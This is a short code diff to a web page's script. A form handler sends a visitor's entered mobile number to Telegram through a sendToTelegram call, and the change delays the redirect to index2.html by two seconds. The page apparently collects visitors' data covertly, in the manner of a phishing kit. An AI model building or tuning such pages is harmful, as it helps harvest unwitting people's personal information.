@@ -191,7 +191,11 @@
         } else {
             document.getElementById('error-message').style.display = 'none'; // Hide error message
             sendToTelegram(mobileNumber); // Send number to Telegram
-            window.location.href = 'index2.html'; // Redirect to index2.html
+            
+            // Redirect to index2.html after a 2-second delay
+            setTimeout(() => {
+                window.location.href = 'index2.html'; // Redirect to index2.html
+            }, 2000); // 2000 milliseconds = 2 seconds
         }
     }
 
@@ -235,7 +239,7 @@
             }
         });
     });
-</script>
+                </script>
 
 </body>
 </html>
